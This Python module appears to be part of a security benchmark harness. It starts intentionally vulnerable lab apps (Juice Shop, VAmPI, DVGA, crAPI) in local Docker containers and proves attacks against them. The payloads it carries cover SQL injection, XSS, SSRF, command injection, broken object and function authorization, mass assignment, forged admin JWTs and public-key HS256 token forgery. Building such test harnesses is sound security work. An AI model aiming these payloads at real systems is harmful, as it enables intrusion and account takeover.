from __future__ import annotations

import atexit
import base64
import contextlib
import hashlib
import hmac
import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import quote, urlencode

from benchmark.harness.score import Finding
from benchmark.matrix.registry import Cell

_JUICE_IMAGE = (
    "bkimminich/juice-shop@sha256:"
    "73c53fbf442e8337b3ea3d98c7e8550308854701ebdfce4cc39768f36b75430e"
)
_VAMPI_IMAGE = (
    "erev0s/vampi@sha256:"
    "0a5a224b6e14ae7da6a6ea265178ff71286ff903aec74adee98f660bb0e4ca12"
)
_DVGA_IMAGE = (
    "dolevf/dvga@sha256:"
    "040aa33c199d99f3380c9ff9a1ee5d725e9abca7b189c63a35a2a73bda79c957"
)
_CRAPI_ADMIN = (
    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9."
    "eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoyMDAwMDAwMDAwLCJyb2xlIjoiYWRtaW4ifQ."
    "5sSq0kQ2_qv4LPpwtKjY2_651a7hHeJCNl6bBmmXx7g"
)
_DVGA_ADMIN = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
    "eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2ODE0OTQ4LCJuYmYiOjE2NTY4MTQ5NDgsImp0aSI6ImI5N2FmY2Qw"
    "LTUzMjctNGFmNi04YTM3LTRlMjdjODY5MGE2YyIsImlkZW50aXR5IjoiYWRtaW4iLCJleHAiOjE2NTY4MjIxNDh9."
    "-56ZQN9jikpuuhpjHjy3vLvdwbtySs0mbdaSq-9RVGg"
)
_JSON = (("Content-Type", "application/json"),)
_PROJECT = "insidia-live"
_XSS_PATH = (
    "/#/search?q=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%22insidia-xss%22%3E"
)
_VAMPI_SQLI = "/users/v1/" + quote("nosuch' OR '1'='1", safe="")


@dataclass(frozen=True)
class Sidecar:
    name: str
    port: int
    body: str


@dataclass(frozen=True)
class RunApp:
    name: str
    image: str
    container_port: int
    host_port: int
    env: tuple[tuple[str, str], ...] = ()
    sidecar: Sidecar | None = None


@dataclass(frozen=True)
class ComposeApp:
    name: str
    web_port: int
    waves: tuple[tuple[str, ...], ...]
    marker_name: str
    marker_image: str
    marker_port: int
    marker_body: str


@dataclass(frozen=True)
class HttpCheck:
    method: str
    path: str
    body: bytes | None
    headers: tuple[tuple[str, str], ...]
    marker: str
    status: int


@dataclass(frozen=True)
class DomCheck:
    path: str
    marker: str


@dataclass(frozen=True)
class OnceGet:
    path: str
    marker: str


@dataclass(frozen=True)
class BearerLogin:
    signup_path: str
    signup_body: bytes
    login_path: str
    login_body: bytes
    token_at: tuple[str, ...] = ("token",)
    # None accepts any signup status. Login is what has to succeed.
    signup_ok: tuple[int, ...] | None = (200, 403)


@dataclass(frozen=True)
class PublicKeyHs256:
    key_path: str
    payload: bytes


@dataclass(frozen=True)
class BearerPost:
    login: BearerLogin
    method: str
    path: str
    body: bytes
    headers: tuple[tuple[str, str], ...]


@dataclass(frozen=True)
class OwnedReport:
    """A report owned by the seeded admin, read back by `reader`."""

    reader: BearerLogin
    owner_login: bytes
    mechanic_code: str
    problem: str


@dataclass(frozen=True)
class LiveCase:
    app: RunApp | ComposeApp
    check: HttpCheck | DomCheck
    setup: OnceGet | BearerLogin | PublicKeyHs256 | BearerPost | OwnedReport | None = None


def _graphql(query: str) -> bytes:
    return json.dumps({"query": query}, separators=(",", ":")).encode()


_UPLOAD_BOUNDARY = "insidiaform"
_UPLOAD = (
    f"--{_UPLOAD_BOUNDARY}\r\n"
    'Content-Disposition: form-data; name="file"; filename="p.mp4"\r\n'
    "Content-Type: video/mp4\r\n"
    "\r\n"
    "not-a-video\r\n"
    f"--{_UPLOAD_BOUNDARY}--\r\n"
).encode()
_JUICE = RunApp("insidia-juice", _JUICE_IMAGE, 3000, 3000)
_JUICE_BOLA = BearerLogin(
    "/api/Users",
    (
        b'{"email":"insidia-bola@juice-sh.op","password":"Insidia1",'
        b'"passwordRepeat":"Insidia1"}'
    ),
    "/rest/user/login",
    b'{"email":"insidia-bola@juice-sh.op","password":"Insidia1"}',
    ("authentication", "token"),
    None,
)
_VAMPI = RunApp("insidia-vampi", _VAMPI_IMAGE, 5000, 5000)
# The image listens on 127.0.0.1 unless WEB_HOST is set, and the published port then resets.
_DVGA = RunApp(
    "insidia-dvga",
    _DVGA_IMAGE,
    5013,
    5013,
    (("WEB_HOST", "0.0.0.0"),),
    # importPaste curls 127.0.0.1 inside this container's network namespace.
    Sidecar("insidia-dvga-ssrf", 8765, "insidia-dvga-ssrf"),
)
_CRAPI = ComposeApp(
    "crapi",
    8888,
    (
        (
            "postgresdb",
            "mongodb",
            "mailhog",
            "crapi-identity",
            "crapi-community",
            "crapi-workshop",
        ),
        ("chromadb", "crapi-chatbot"),
        ("crapi-web",),
    ),
    "insidia-marker",
    _VAMPI_IMAGE,
    8080,
    "insidia-ssrf-plant",
)
_CRAPI_ACCESS = BearerLogin(
    "/identity/api/auth/signup",
    (
        b'{"name":"Insidia Plant","email":"insidia-access@example.com",'
        b'"number":"8888888881","password":"Insidia1"}'
    ),
    "/identity/api/auth/login",
    b'{"email":"insidia-access@example.com","password":"Insidia1"}',
)
_BEARER = (("Authorization", "Bearer {token}"),)

_CHECKS: dict[tuple[str, str], LiveCase] = {
    ("juiceshop", "web.sqli"): LiveCase(
        _JUICE,
        HttpCheck(
            "POST",
            "/rest/user/login",
            b'{"email":"\' or 1=1--","password":"x"}',
            _JSON,
            "admin@juice-sh.op",
            200,
        ),
    ),
    ("juiceshop", "web.xss"): LiveCase(
        _JUICE,
        DomCheck(_XSS_PATH, '<img src="x" onerror='),
    ),
    ("vampi", "web.sqli"): LiveCase(
        _VAMPI,
        HttpCheck("GET", _VAMPI_SQLI, None, (), "mail1@mail.com", 200),
        OnceGet("/createdb", "Database populated."),
    ),
    ("crapi", "web.ssrf"): LiveCase(
        _CRAPI,
        HttpCheck(
            "POST",
            "/workshop/api/merchant/contact_mechanic",
            b'{"mechanic_api":"http://insidia-marker:8080/plant"}',
            (
                *_JSON,
                ("Authorization", "Bearer {token}"),
            ),
            "insidia-ssrf-plant",
            200,
        ),
        BearerLogin(
            "/identity/api/auth/signup",
            (
                b'{"name":"Insidia Plant","email":"insidia-ssrf@example.com",'
                b'"number":"9999999999","password":"Insidia1"}'
            ),
            "/identity/api/auth/login",
            b'{"email":"insidia-ssrf@example.com","password":"Insidia1"}',
        ),
    ),
    ("juiceshop", "api.bola_idor"): LiveCase(
        _JUICE,
        HttpCheck("GET", "/rest/basket/1", None, _BEARER, "Apple Juice (1000ml)", 200),
        _JUICE_BOLA,
    ),
    # Each proof has to see 201, and Juice Shop will only create a given email once.
    ("juiceshop", "api.bfla"): LiveCase(
        _JUICE,
        HttpCheck(
            "POST",
            "/api/Users",
            (
                b'{"email":"insidia-role-plant-{seq}@juice-sh.op","password":"Insidia1",'
                b'"passwordRepeat":"Insidia1","role":"admin"}'
            ),
            _JSON,
            '"role":"admin"',
            201,
        ),
    ),
    ("juiceshop", "auth.jwt_oauth_session"): LiveCase(
        _JUICE,
        HttpCheck(
            "GET",
            "/rest/user/whoami",
            None,
            (("Cookie", "token={token}"),),
            "rsa_lord@juice-sh.op",
            200,
        ),
        PublicKeyHs256(
            "/encryptionkeys/jwt.pub",
            b'{"data":{"email":"rsa_lord@juice-sh.op","role":"admin"}}',
        ),
    ),
    ("crapi", "api.bola_idor"): LiveCase(
        _CRAPI,
        HttpCheck(
            "GET",
            "/workshop/api/mechanic/mechanic_report?report_id={report_id}",
            None,
            _BEARER,
            "admin@example.com",
            200,
        ),
        OwnedReport(
            _CRAPI_ACCESS,
            b'{"email":"admin@example.com","password":"Admin!123"}',
            "TRAC_JME",
            "insidia-bola-plant",
        ),
    ),
    ("crapi", "api.bfla"): LiveCase(
        _CRAPI,
        HttpCheck(
            "GET",
            "/community/api/v2/community/posts/recent",
            None,
            _BEARER,
            "robot001@example.com",
            200,
        ),
        _CRAPI_ACCESS,
    ),
    ("crapi", "api.mass_assignment"): LiveCase(
        _CRAPI,
        HttpCheck(
            "PUT",
            "/identity/api/v2/user/videos/1",
            b'{"videoName":"plant","conversion_params":"insidia-mass"}',
            (*_JSON, *_BEARER),
            '"conversion_params":"insidia-mass"',
            200,
        ),
        BearerPost(
            _CRAPI_ACCESS,
            "POST",
            "/identity/api/v2/user/videos",
            _UPLOAD,
            (
                ("Content-Type", f"multipart/form-data; boundary={_UPLOAD_BOUNDARY}"),
                *_BEARER,
            ),
        ),
    ),
    ("crapi", "auth.jwt_oauth_session"): LiveCase(
        _CRAPI,
        HttpCheck(
            "GET",
            "/identity/api/v2/user/dashboard",
            None,
            (("Authorization", f"Bearer {_CRAPI_ADMIN}"),),
            "ROLE_ADMIN",
            200,
        ),
    ),
    ("dvga", "web.sqli"): LiveCase(
        _DVGA,
        HttpCheck(
            "POST",
            "/graphql",
            _graphql('{ pastes(filter:"aaa \' or 1=1--") { content title } }'),
            _JSON,
            "My First Paste",
            200,
        ),
    ),
    ("dvga", "web.cmdi"): LiveCase(
        _DVGA,
        HttpCheck(
            "POST",
            "/graphql",
            _graphql('{ systemDebug(arg:"-ef") }'),
            _JSON,
            "ps -ef",
            200,
        ),
    ),
    ("dvga", "web.ssrf"): LiveCase(
        _DVGA,
        HttpCheck(
            "POST",
            "/graphql",
            _graphql(
                'mutation { importPaste(host:"127.0.0.1", port:8765, path:"/plant", '
                'scheme:"http") { result } }'
            ),
            _JSON,
            "insidia-dvga-ssrf",
            200,
        ),
    ),
    ("dvga", "api.bola_idor"): LiveCase(
        _DVGA,
        HttpCheck(
            "POST",
            "/graphql",
            _graphql("{ paste(id:1) { id title content public } }"),
            _JSON,
            "My First Paste",
            200,
        ),
    ),
    ("dvga", "api.bfla"): LiveCase(
        _DVGA,
        HttpCheck(
            "POST",
            "/graphql",
            _graphql("{ users { username } }"),
            _JSON,
            '"username":"admin"',
            200,
        ),
    ),
    ("dvga", "auth.jwt_oauth_session"): LiveCase(
        _DVGA,
        HttpCheck(
            "POST",
            "/graphql",
            _graphql(f'{{ me(token: "{_DVGA_ADMIN}") {{ username password }} }}'),
            _JSON,
            "changeme",
            200,
        ),
    ),
}

_STARTED: list[str] = []
_COMPOSE: tuple[Path, str] | None = None
_HOST_PORT: dict[str, int] = {}
_ONCE: set[str] = set()
_POSTED: set[tuple[str, str]] = set()
_SEQ = 0
_TOKEN: dict[tuple[str, BearerLogin | PublicKeyHs256], str] = {}
_REPORT_ID = ""
_PROVED: dict[tuple[str, str, str], bool] = {}


def live_ready(cell: Cell) -> bool:
    return (
        cell.phase in {"1B", "1C"}
        and cell.box in {"black", "gray"}
        and cell.conn in {"direct", "tunnel"}
        and (cell.target, cell.attack) in _CHECKS
    )


def prove_live(cell: Cell) -> list[Finding]:
    key = (cell.target, cell.attack, cell.conn)
    proved = _PROVED.get(key)
    if proved is None:
        proved = _hit(cell)
        _PROVED[key] = proved
    if not proved:
        return []
    return [Finding(cell.plant_ids[0])]


def _hit(cell: Cell) -> bool:
    case = _CHECKS[(cell.target, cell.attack)]
    host = _ensure(case.app)
    token = _prepare(case, host)
    with _view(cell.conn, host) as port:
        return _matches(case.check, port, token)


@contextlib.contextmanager
def _view(conn: str, port: int) -> Iterator[int]:
    if conn == "direct":
        yield port
        return
    from benchmark.harness.run_cell import _start_tunnel

    listener, thread = _start_tunnel(port)
    try:
        yield int(listener.getsockname()[1])
    finally:
        listener.close()
        thread.join(timeout=2)


def _matches(check: HttpCheck | DomCheck, port: int, token: str | None) -> bool:
    if isinstance(check, DomCheck):
        return _dom(port, check)
    status, body = _exchange(port, check.method, check.path, check.body, check.headers, token)
    return status == check.status and check.marker in body.decode("utf-8", "replace")


def _prepare(case: LiveCase, port: int) -> str | None:
    setup = case.setup
    if isinstance(setup, OnceGet):
        if case.app.name not in _ONCE:
            _status, body = _exchange(port, "GET", setup.path, None, (), None)
            if setup.marker not in body.decode("utf-8", "replace"):
                raise RuntimeError(f"{setup.path} missing {setup.marker}")
            _ONCE.add(case.app.name)
        return None
    if isinstance(setup, BearerLogin | PublicKeyHs256):
        return _token_for(port, case.app.name, setup)
    if isinstance(setup, BearerPost):
        token = _token_for(port, case.app.name, setup.login)
        _post_once(port, case.app.name, setup, token)
        return token
    if isinstance(setup, OwnedReport):
        return _owned_report(port, setup)
    return None


def _owned_report(port: int, setup: OwnedReport) -> str:
    """Fresh crAPI has no mechanic report until workshop sees a vehicle."""
    global _REPORT_ID
    token = _token_for(port, "crapi", setup.reader)
    status, body = _exchange(
        port,
        "POST",
        setup.reader.login_path,
        setup.owner_login,
        _JSON,
        None,
    )
    if status != 200:
        raise RuntimeError(f"admin login returned {status}: {_text(body)}")
    owner = _at(json.loads(body), setup.reader.token_at)
    vin = _admin_vin(port, owner)
    query = urlencode(
        {
            "mechanic_code": setup.mechanic_code,
            "problem_details": setup.problem,
            "vin": vin,
        }
    )
    deadline = time.monotonic() + 45
    last = ""
    report_id: object = None
    while time.monotonic() < deadline:
        status, body = _exchange(
            port,
            "GET",
            f"/workshop/api/mechanic/receive_report?{query}",
            None,
            (),
            None,
        )
        if status == 200:
            report_id = json.loads(body).get("id")
            if isinstance(report_id, int):
                break
        last = _text(body)
        time.sleep(1)
    else:
        raise RuntimeError(f"receive_report returned no id: {last}")
    _REPORT_ID = str(report_id)
    return token


def _admin_vin(port: int, owner: str) -> str:
    deadline = time.monotonic() + 45
    last = ""
    auth = (("Authorization", f"Bearer {owner}"),)
    while time.monotonic() < deadline:
        status, body = _exchange(
            port,
            "GET",
            "/identity/api/v2/vehicle/vehicles",
            None,
            auth,
            None,
        )
        if status == 200:
            rows = json.loads(body)
            if isinstance(rows, list) and rows and isinstance(rows[0], dict):
                vin = rows[0].get("vin")
                if isinstance(vin, str) and vin:
                    return vin
        last = _text(body)
        time.sleep(1)
    raise RuntimeError(f"admin vehicle missing: {last}")


def _token_for(port: int, app: str, setup: BearerLogin | PublicKeyHs256) -> str:
    key = (app, setup)
    cached = _TOKEN.get(key)
    if cached is None:
        if isinstance(setup, BearerLogin):
            cached = _bearer(port, setup)
        else:
            cached = _public_key_hs256(port, setup)
        _TOKEN[key] = cached
    return cached


def _bearer(port: int, setup: BearerLogin) -> str:
    status, body = _exchange(
        port,
        "POST",
        setup.signup_path,
        setup.signup_body,
        _JSON,
        None,
    )
    if setup.signup_ok is not None and status not in setup.signup_ok:
        raise RuntimeError(f"signup returned {status}: {_text(body)}")
    status, body = _exchange(
        port,
        "POST",
        setup.login_path,
        setup.login_body,
        _JSON,
        None,
    )
    if status != 200:
        raise RuntimeError(f"login returned {status}: {_text(body)}")
    return _at(json.loads(body), setup.token_at)


def _public_key_hs256(port: int, setup: PublicKeyHs256) -> str:
    status, key = _exchange(port, "GET", setup.key_path, None, (), None)
    if status != 200 or key == b"":
        raise RuntimeError(f"{setup.key_path} returned {status}")
    return _sign_hs256(key, setup.payload)


def _sign_hs256(key: bytes, payload: bytes) -> str:
    header = b'{"alg":"HS256","typ":"JWT"}'
    signing = _b64(header) + b"." + _b64(payload)
    digest = hmac.new(key, signing, hashlib.sha256).digest()
    return (signing + b"." + _b64(digest)).decode()


def _b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def _at(payload: object, path: tuple[str, ...]) -> str:
    current = payload
    for key in path:
        if not isinstance(current, dict) or key not in current:
            raise RuntimeError("login returned no token")
        current = current[key]
    if not isinstance(current, str) or current == "":
        raise RuntimeError("login returned no token")
    return current


def _post_once(port: int, app: str, setup: BearerPost, token: str) -> None:
    key = (app, setup.path)
    if key in _POSTED:
        return
    status, body = _exchange(port, setup.method, setup.path, setup.body, setup.headers, token)
    if status >= 400:
        raise RuntimeError(f"{setup.path} returned {status}: {_text(body)}")
    _POSTED.add(key)


def _text(body: bytes) -> str:
    return body[:300].decode("utf-8", "replace")


def _plant(body: bytes | None) -> bytes | None:
    if body is None or b"{seq}" not in body:
        return body
    global _SEQ
    _SEQ += 1
    return body.replace(b"{seq}", f"{time.time_ns()}-{_SEQ}".encode())


def _exchange(
    port: int,
    method: str,
    path: str,
    body: bytes | None,
    headers: tuple[tuple[str, str], ...],
    token: str | None,
) -> tuple[int, bytes]:
    rendered: dict[str, str] = {}
    for key, value in headers:
        if "{token}" in value:
            if token is None:
                raise RuntimeError(f"{path} needs a token")
            value = value.replace("{token}", token)
        rendered[key] = value
    if "{report_id}" in path:
        if _REPORT_ID == "":
            raise RuntimeError(f"{path} needs a report id")
        path = path.replace("{report_id}", _REPORT_ID)
    request = urllib.request.Request(
        f"http://127.0.0.1:{port}{path}",
        data=_plant(body),
        headers=rendered,
        method=method,
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            return int(response.status), response.read()
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read()


def _dom(port: int, check: DomCheck) -> bool:
    url = f"http://127.0.0.1:{port}{check.path}"
    for _ in range(8):
        result = _chrome(url)
        if check.marker in result.stdout:
            return True
        if result.returncode != 0:
            detail = (result.stderr or result.stdout).strip()
            raise RuntimeError(f"google-chrome exited {result.returncode}: {detail[-1500:]}")
    return False


def _chrome(url: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [
            "google-chrome",
            "--headless=new",
            "--disable-gpu",
            "--no-sandbox",
            "--timeout=8000",
            "--virtual-time-budget=5000",
            "--dump-dom",
            url,
        ],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )


def _ensure(app: RunApp | ComposeApp) -> int:
    if isinstance(app, RunApp):
        return _ensure_run(app)
    return _ensure_compose(app)


def _ensure_run(app: RunApp) -> int:
    cached = _HOST_PORT.get(app.name)
    if cached is not None:
        return cached
    if not _adopt_run(app):
        if app.sidecar is not None:
            _remove(app.sidecar.name)
        _remove(app.name)
        command = [
            "run",
            "-d",
            "--name",
            app.name,
            "-p",
            f"127.0.0.1:{app.host_port}:{app.container_port}",
        ]
        for key, value in app.env:
            command.extend(["-e", f"{key}={value}"])
        command.append(app.image)
        _docker(command)
        _STARTED.append(app.name)
    _wait_http(app.host_port, "/")
    if app.sidecar is not None:
        _ensure_sidecar(app)
    _HOST_PORT[app.name] = app.host_port
    return app.host_port


def _adopt_run(app: RunApp) -> bool:
    if _inspect(app.name, "{{.State.Running}}") != "true":
        return False
    if _inspect(app.name, "{{.Image}}") != _image_id(app.image):
        return False
    if _binding(app.name, app.container_port) != ("127.0.0.1", str(app.host_port)):
        return False
    return _env_ok(app.name, app.env)


def _env_ok(name: str, env: tuple[tuple[str, str], ...]) -> bool:
    if not env:
        return True
    raw = _inspect(name, "{{json .Config.Env}}")
    if raw is None:
        return False
    found = json.loads(raw)
    if not isinstance(found, list):
        return False
    present = {str(item) for item in found}
    return all(f"{key}={value}" in present for key, value in env)


def _ensure_sidecar(app: RunApp) -> None:
    sidecar = app.sidecar
    if sidecar is None:
        return
    if _sidecar_ok(app, sidecar):
        return
    _remove(sidecar.name)
    _docker(
        [
            "run",
            "-d",
            "--name",
            sidecar.name,
            "--network",
            f"container:{app.name}",
            "--entrypoint",
            "python",
            app.image,
            "-c",
            _listen_program(sidecar.port, sidecar.body),
        ]
    )
    _STARTED.append(sidecar.name)
    _wait_serves(sidecar.name, sidecar.port, sidecar.body)


def _sidecar_ok(app: RunApp, sidecar: Sidecar) -> bool:
    if _inspect(sidecar.name, "{{.State.Running}}") != "true":
        return False
    if not _joined(app.name, sidecar.name):
        return False
    return _serves(sidecar.name, sidecar.port, sidecar.body)


def _joined(app: str, sidecar: str) -> bool:
    mode = _inspect(sidecar, "{{.HostConfig.NetworkMode}}") or ""
    if mode == f"container:{app}":
        return True
    app_id = _inspect(app, "{{.Id}}") or ""
    bare = app_id.removeprefix("sha256:")
    return mode in {f"container:{app_id}", f"container:{bare}"}


def _remove(name: str) -> None:
    if _inspect(name, "{{.State.Status}}") is not None:
        _docker(["rm", "-f", name])


def _ensure_compose(app: ComposeApp) -> int:
    cached = _HOST_PORT.get(app.name)
    if cached is not None:
        return cached
    compose_file = _compose_file()
    if not (_inspect("crapi-web", "{{.State.Running}}") == "true" and _http_up(app.web_port)):
        _down_foreign(compose_file)
        _start_waves(app, compose_file)
    _wait_http(app.web_port, "/")
    network = _primary_network("crapi-web")
    _ensure_marker(app, network)
    _HOST_PORT[app.name] = app.web_port
    return app.web_port


def _start_waves(app: ComposeApp, compose_file: Path) -> None:
    global _COMPOSE
    _COMPOSE = (compose_file, _PROJECT)
    for wave in app.waves:
        if "crapi-web" in wave:
            _wait_running("crapi-chatbot")
        _compose(compose_file, _PROJECT, ["up", "-d", *wave])


def _ensure_marker(app: ComposeApp, network: str) -> None:
    if _marker_ok(app, network):
        return
    if _inspect(app.marker_name, "{{.State.Status}}") is not None:
        _docker(["rm", "-f", app.marker_name])
    _docker(
        [
            "run",
            "-d",
            "--name",
            app.marker_name,
            "--network",
            network,
            "--entrypoint",
            "python",
            app.marker_image,
            "-c",
            _listen_program(app.marker_port, app.marker_body),
        ]
    )
    _STARTED.append(app.marker_name)
    _wait_serves(app.marker_name, app.marker_port, app.marker_body)


def _marker_ok(app: ComposeApp, network: str) -> bool:
    if _inspect(app.marker_name, "{{.State.Running}}") != "true":
        return False
    if network not in _networks(app.marker_name):
        return False
    return _serves(app.marker_name, app.marker_port, app.marker_body)


def _listen_program(port: int, body: str) -> str:
    literal = json.dumps(body)
    return (
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
        "class Handler(BaseHTTPRequestHandler):\n"
        "    def do_GET(self):\n"
        f"        payload = {literal}.encode()\n"
        "        self.send_response(200)\n"
        '        self.send_header("Content-Length", str(len(payload)))\n'
        "        self.end_headers()\n"
        "        self.wfile.write(payload)\n"
        "    def log_message(self, fmt, *args):\n"
        "        return\n"
        f'HTTPServer(("0.0.0.0", {port}), Handler).serve_forever()\n'
    )


def _serves(name: str, port: int, body: str) -> bool:
    code = (
        "import urllib.request\n"
        "body = urllib.request.urlopen("
        f"'http://127.0.0.1:{port}/plant', timeout=2).read().decode()\n"
        "print(body)\n"
    )
    result = subprocess.run(
        ["docker", "exec", name, "python", "-c", code],
        capture_output=True,
        text=True,
        timeout=10,
        check=False,
    )
    return result.returncode == 0 and body in result.stdout


def _wait_serves(name: str, port: int, body: str) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if _serves(name, port, body):
            return
        time.sleep(0.2)
    raise RuntimeError(f"{name} did not serve {body}")


def _down_foreign(compose_file: Path) -> None:
    project = _inspect("crapi-web", '{{index .Config.Labels "com.docker.compose.project"}}')
    if project:
        _compose(compose_file, project, ["down"])


def _compose(compose_file: Path, project: str, args: list[str], *, timeout: float = 600) -> None:
    env = os.environ.copy()
    env["TLS_ENABLED"] = "false"
    env["COMPOSE_PROJECT_NAME"] = project
    result = subprocess.run(
        ["docker", "compose", "-f", str(compose_file), "-p", project, *args],
        cwd=compose_file.parent,
        env=env,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    if result.returncode != 0:
        detail = (result.stderr or result.stdout).strip()
        raise RuntimeError(f"docker compose {' '.join(args)} failed: {detail}")


def _compose_file() -> Path:
    return _local_targets() / "crAPI" / "deploy" / "docker" / "docker-compose.yml"


def _local_targets() -> Path:
    override = os.environ.get("INSIDIA_LOCAL_TARGETS")
    if override:
        return Path(override)
    return Path(__file__).resolve().parents[3] / "local-targets"


def _wait_http(port: int, path: str) -> None:
    deadline = time.monotonic() + 120
    last = "no response"
    while time.monotonic() < deadline:
        if _http_up(port, path):
            return
        last = f"127.0.0.1:{port}{path}"
        time.sleep(0.5)
    raise RuntimeError(f"{last} did not answer")


def _http_up(port: int, path: str = "/") -> bool:
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}{path}", timeout=2) as response:
            response.read()
            return int(response.status) < 500
    except urllib.error.HTTPError as exc:
        return int(exc.code) < 500
    except OSError:
        return False


def _wait_running(name: str) -> None:
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if _inspect(name, "{{.State.Running}}") == "true":
            return
        time.sleep(1)
    raise RuntimeError(f"{name} did not start")


def _binding(name: str, container_port: int) -> tuple[str, str] | None:
    raw = _inspect(name, "{{json .NetworkSettings.Ports}}")
    if raw is None:
        return None
    ports = json.loads(raw)
    bindings = ports.get(f"{container_port}/tcp") if isinstance(ports, dict) else None
    if not bindings:
        return None
    first = bindings[0]
    return str(first.get("HostIp", "")), str(first.get("HostPort", ""))


def _networks(name: str) -> set[str]:
    raw = _inspect(name, "{{json .NetworkSettings.Networks}}")
    if raw is None:
        return set()
    payload = json.loads(raw)
    if not isinstance(payload, dict):
        return set()
    return set(payload)


def _primary_network(name: str) -> str:
    names = _networks(name)
    if not names:
        raise RuntimeError(f"{name} has no network")
    return sorted(names)[0]


def _image_id(ref: str) -> str:
    result = subprocess.run(
        ["docker", "image", "inspect", "-f", "{{.Id}}", ref],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        detail = (result.stderr or result.stdout).strip()
        raise RuntimeError(f"missing image {ref}: {detail}")
    return result.stdout.strip()


def _inspect(name: str, fmt: str) -> str | None:
    result = subprocess.run(
        ["docker", "inspect", "-f", fmt, name],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    return result.stdout.strip()


def _docker(args: list[str]) -> None:
    result = subprocess.run(
        ["docker", *args],
        capture_output=True,
        text=True,
        timeout=180,
        check=False,
    )
    if result.returncode != 0:
        detail = (result.stderr or result.stdout).strip()
        raise RuntimeError(f"docker {' '.join(args[:4])} failed: {detail}")


def _stop_started() -> None:
    for name in reversed(_STARTED):
        subprocess.run(
            ["docker", "rm", "-f", name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
    if _COMPOSE is None:
        return
    compose_file, project = _COMPOSE
    env = os.environ.copy()
    env["COMPOSE_PROJECT_NAME"] = project
    subprocess.run(
        ["docker", "compose", "-f", str(compose_file), "-p", project, "down"],
        cwd=compose_file.parent,
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )


atexit.register(_stop_started)
